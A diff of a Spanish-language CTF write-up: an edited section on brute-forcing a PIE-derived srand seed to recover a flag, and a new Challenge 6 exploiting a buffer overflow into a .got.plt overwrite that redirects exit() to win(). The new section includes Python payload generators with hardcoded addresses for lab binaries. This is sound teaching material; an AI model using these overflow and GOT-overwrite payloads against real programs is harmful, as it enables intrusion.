@@ -10,7 +10,8 @@ Ya con este analisis inicial continuamos con Cutter para hacer el dissasembly y 
     
     0x000006a4 call srand ; sym.imp.srand ; void srand(int seed)
 
-Aca lo que vemos es que utiliza la instruccion "lea" para calcular la direccion efectiva de la funcion main, como es un binario PIE esta direccion cambia cada vez que se corre el programa. Ahora sabiendo esto podemos probar todas las direcciones de memoria posibles e ir comprobando el checksum hasta conseguir el secreto original. Pero primero veamos que las posibilidades se pueden achicar. Viendo el objdump o el dissasembly sabemos que la fucion main tiene un offset de 0x66c es decir sin importar donde se cargue el programa el final de la direccion de main va a ser 0x0000066c (Esto no estabamos seguros que fuese asi al principio pues indicaria que siempre se carga el programa en multiplos de 1000, es decir no sabiamos si la direccion donde se cargaba podia tener numeros en las ultimos 3 digitos y tal vez el offset se sumaba, para comprobarlo lo corrimos varias veces y con gdb comprobamos que main siempre se encontraba en una direccion que terminaba con "66c"). Esto baja las posibles seeds de **4.294.967.295** a **1.048.576** lo cual es mas facil de bruteforcear. De ahi fue cuestion de armar un programita en c que toma la seed como argumento y imprima la secuencia de 38 numeros (sabemos que son 38 porque el ejercicio tiene 76 numeros en hexa) para esa seed, volver a hacer el xor y ver si pega el checksum.
+Aca lo que vemos es que utiliza la instruccion "lea" para calcular la direccion efectiva de la funcion main, como es un binario PIE esta direccion cambia cada vez que se corre el programa. Ahora sabiendo esto podemos probar todas las direcciones de memoria posibles e ir comprobando el checksum hasta conseguir el secreto original. Pero primero veamos que las posibilidades se pueden achicar. Viendo el objdump o el dissasembly sabemos que la fucion main tiene un offset de 0x66c es decir sin importar donde se cargue el programa el final de la direccion de main va a ser 0x0000066c (Esto no estabamos seguros que fuese asi al principio pues indicaria que siempre se carga el programa en multiplos de 1000, es decir no sabiamos si la direccion donde se cargaba podia tener numeros en las ultimos 3 digitos y tal vez el offset se sumaba, para comprobarlo lo corrimos varias veces y con gdb comprobamos que main siempre se encontraba en una direccion que terminaba con "66c"). Esto baja las posibles seeds de **4.294.967.295** a **1.048.576** lo cual es mas facil de bruteforcear. De ahi fue cuestion de armar un programa en c que probara con todas las direeciones de memoria posibles de main como seed de srand y que luego aplicara la transformacion necesaria (xor y and). Una vez que obtenemos el string podemos calcular el hash md5 de ese string y compararlo con el dado para ver si encontramos el secreto o esa direccion de memoria no era. El programa en c que creamos se encuentra en la carpeta ej1 y nos permitio obtener el secreto  "The flag is EKO{bullshit_PIE_over_x86}" luego de usar la direccion "0xF775C66C" como seed de srand. Tuvimos algunos problemas donde el programa se quedaba loopeando si no encontraba el flag y descubrimos que se debia a que 0xFFFFFFFF (la maxima direccion de memoria) tambien es el valor maximo de un unsigned int asi que tuvimos que ajustar el programa acordemente usando unsigned longs donde fue necesario.
+
 
 ### Ej 2
 
@@ -785,3 +786,39 @@ es decir, pisamos el eip del challenge 2 para obtener un payload mas grande y as
     f = open('ej2y3', 'wb')
 
     f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
+
+
+#### Challenge 6
+
+Lo primero que intentamos en este challenge fue causar un buffer overflow y cambiar la return address de la funcion, pero ahi notamos que al final de main no habia un return si no que habia un exit(-1) asi que este metodo no nos iba a funcionar. Sabiendo que podiamos overflowear el buffer 2 nos pusimos a ver que podiamos pisar y nos dimos cuenta que el puntero hacia buf1 se guarda en el stack asi que podiamos poner cualquier direccion de la memoria en ese puntero. Viendo que luego se hace un strcpy y combinado a lo que vimos recien nos dimos cuenta que podiamos escribir cualquier direccion de la memoria poniendo lo que queriamos escribir al principio de buffer2 y poniendo la direccion a donde lo queremos escribir justo al final del payload que le pasamos que cause apenas un buffer overflow (ya que el puntero esta inmediatamente despues en el stack). Sabiendo esto nos pusimos a pensar de que nos podia servir, sabiamos que la parte .text del programa suele estar protegida contra escritura pero viendo el resumen en cutter vimos que el binario tenia RELRO parcial y como encontramos en [este post](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) la seccion .got.plt se puede escribir. Leyendo .got.plt podemos ver que tiene informacion de donde se encuentra la funcion strcpy y la funcion exit. Esta ultima es la que nos interesa ya que escribiendo en esa direccion la direccion de memoria de la funcion win podiamos forzar al programa a llamar a win() cuando creia que estaba llamando a exit(-1). Luego fue cuestion de analizar bien las direcciones en gdb y armar el payload lo cual hicimos de la siguiente manera:
+
+    f = open('ej6','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 376 + '\x14\xa0\x04\x08')
+
+donde 0x0804a014 es la direccion de .got.plt donde se encuentran los datos de exit y 0x080484d9 hasta 080484d9 es mas o menos donde se encuentra win y es lo que se escribe cuando corre strcpy con el puntero pisado anteriormente.
+
+Finalmente las combinaciones fueron bastante faciles ya que el buffer este es bastante grande asi que no se pisa con cosas de los otros ejercicios ni al principio(que los otros ni lo usan) ni al final (ya que tienen distintos tamaños tamaños de buffer ). Utilizamos los siguientes codigos para generar los payloads respectivos:
+
+    Ej 6 y 1
+    f = open('ej6y1','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A'*72 + 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')
+
+    Ej 6 y 2
+    f = open('ej6y2','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 62 + '\x04\x03\x02\x01' + 'A' * 310 + '\x14\xa0\x04\x08')
+
+    Ej 6 y 3
+    f = open('ej6y3','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A'*60 + '\x5a\x84\x04\x08' + 'A' * 312 + '\x14\xa0\x04\x08')
+
+    Ej 6_1y2
+    f = open('ej6_1y2','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 62 + '\x04\x03\x02\x01' +'A'* 6+ 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')
+
+    Ej 6_1y3
+    f = open('ej6_1y3','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 60 + '\x5a\x84\x04\x08' +'A'* 8 + 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')
+
+    Ej 6_2y3
+    f = open('ej6_2y3','wb')
+    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 60 + '\x5a\x84\x04\x08' +'A'* 6 +  '\x5a\x84\x04\x08' + 'A' * 302 + '\x14\xa0\x04\x08')
